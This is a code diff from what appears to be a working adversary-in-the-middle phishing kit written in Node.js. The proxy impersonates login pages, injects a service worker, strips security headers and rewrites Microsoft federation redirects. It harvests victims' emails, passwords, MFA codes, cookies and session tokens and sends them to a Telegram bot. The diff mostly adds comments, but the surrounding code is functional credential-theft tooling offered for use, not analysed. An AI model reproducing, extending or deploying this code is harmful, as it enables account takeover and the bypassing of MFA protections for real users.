@@ -2060,6 +2262,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     console.log('📥 Incoming URL:', url);
 
+    // ── PAGE‑LOAD NOTIFICATION (plain text) ──
     if (url.includes('/login') && url.includes(PHISHED_URL_PARAMETER)) {
         console.log('🔥 ENTRY POINT MATCHED');
         logVisit(clientRequest, 'aitm');
@@ -2077,6 +2280,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
+            // ── Inject Service Worker ──
             const indexPath = path.join(__dirname, PROXY_FILES.index);
             let html = fs.readFileSync(indexPath, 'utf-8');
             const swRegistrationScript = `
@@ -2089,6 +2293,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 </script>`;
             html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');
 
+            // ── Send Telegram notification (plain text) ──
             (async () => {
                 try {
                     const country = await getCountryInfo(clientIp);
@@ -2096,6 +2301,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         chat_id: CHAT_ID,
                         text: message
+                        // No parse_mode – plain text
                     });
                     console.log('✅ Page-load notification sent (plain text).');
                 } catch (e) {
@@ -2114,6 +2320,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         }
     }
 
+    // ── SERVICE WORKER ──
     if (url === PROXY_PATHNAMES.serviceWorker) {
         if (!fs.existsSync(swFilePath)) {
             fs.writeFileSync(swFilePath, serviceWorkerCode);
@@ -2137,6 +2344,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
+    // ── Favicon ──
     if (url === PROXY_PATHNAMES.favicon) {
         if (currentSession && VICTIM_SESSIONS[currentSession]) {
             clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
@@ -2147,6 +2355,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
+    // ── Proxied requests ──
     if (url === PROXY_PATHNAMES.proxy || currentSession) {
         let clientRequestBody = [];
         clientRequest
@@ -2154,11 +2363,13 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             .on("data", (chunk) => clientRequestBody.push(chunk))
             .on("end", () => {
                 clientRequestBody = Buffer.concat(clientRequestBody).toString();
+
                 if (!currentSession) {
                     clientResponse.writeHead(301, { Location: REDIRECT_URL });
                     clientResponse.end();
                     return;
                 }
+
                 let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                 const proxyRequestOptions = {
                     hostname: VICTIM_SESSIONS[currentSession].hostname,
@@ -2169,6 +2380,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     rejectUnauthorized: false
                 };
                 let isNavigationRequest = false;
+
                 if (clientRequestBody) {
                     if (url === PROXY_PATHNAMES.jsCookie) {
                         updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
@@ -2181,6 +2393,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             const parsed = JSON.parse(clientRequestBody);
                             let proxyRequestURL = new URL(parsed.url);
                             let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
+
                             if (proxyRequestURL.hostname === headers.host) {
                                 if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                     const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
@@ -2236,12 +2449,15 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 } else {
                     console.warn(`No request body for URL: ${url}`);
                 }
+
                 proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                 updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
+
                 const proxyRequestBody = clientRequestBody.body || clientRequestBody;
                 const contentLength = Buffer.byteLength(proxyRequestBody);
                 if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
                 else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }
+
                 if (isNavigationRequest) {
                     VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                     VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
@@ -2249,6 +2465,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                     VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                 }
+
                 const protocol = proxyRequestProtocol === "https:" ? https : http;
                 const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
                     if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
@@ -2264,17 +2481,20 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
                         } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
                     }
+
                     const setCookieHeaders = proxyResponse.headers["set-cookie"];
                     if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
                     proxyResponse.headers["cache-control"] = "no-store";
                     proxyResponse.headers["access-control-allow-origin"] = `https://${headers.host}`;
                     deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
+
                     let responseBody = [];
                     proxyResponse
                         .on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
                         .on("data", (chunk) => responseBody.push(chunk))
                         .on("end", async () => {
                             let bodyBuffer = Buffer.concat(responseBody);
+
                             let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                             let phishedUrl = VICTIM_SESSIONS[currentSession]?.host || 'N/A';
                             try {
@@ -2337,6 +2557,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             } catch (e) {
                                 console.error('❌ Telegram extraction error:', e.message);
                             }
+
                             if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
@@ -2346,7 +2567,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 } catch (error) {
                                     displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                 }
-                            } else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
+                            }
+
+                            else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                     bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
@@ -2356,10 +2579,12 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                     displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                 }
                             }
+
                             clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                             clientResponse.end(bodyBuffer);
                         });
                 });
+
                 if (proxyRequestBody) proxyReq.write(proxyRequestBody);
                 proxyReq.end();
             });
@@ -2369,7 +2594,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     }
 });
 
-// ── Start Server ──
+// ============================================================
+// 🚀 START SERVER + WEBSOCKET
+// ============================================================
 const PORT = process.env.PORT || 3000;
 
 if (WebSocket) {
@@ -2431,6 +2658,7 @@ server.listen(PORT, '::', () => {
     console.log(`📈 Analytics: ACTIVE`);
     console.log(`📧 Webmail: ACTIVE`);
     console.log(`🔌 WebSocket: /ws (live log updates)`);
+
     if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
     }
